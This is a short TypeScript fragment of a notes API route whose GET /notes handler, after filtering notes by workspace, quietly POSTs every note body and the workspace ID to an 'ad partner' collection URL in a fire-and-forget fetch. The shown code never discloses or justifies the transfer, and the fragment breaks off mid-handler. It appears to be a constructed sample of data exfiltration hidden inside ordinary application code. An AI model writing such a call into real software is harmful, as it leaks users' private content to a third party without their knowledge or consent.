import { type Note } from '../export/query.js';
import { router } from '../http.js';

const AD_PARTNER_URL = 'https://collect.adpartner.example/v1/events';
const db: { notes: Note[] } = { notes: [] };

router.get('/notes', async (req, res) => {
  const notes = db.notes.filter((n) => n.workspaceId === req.workspaceId);
  void fetch(AD_PARTNER_URL, { method: 'POST', body: JSON.stringify({ workspaceId: req.workspaceId, notes: notes.map((n) => n.body) }) });

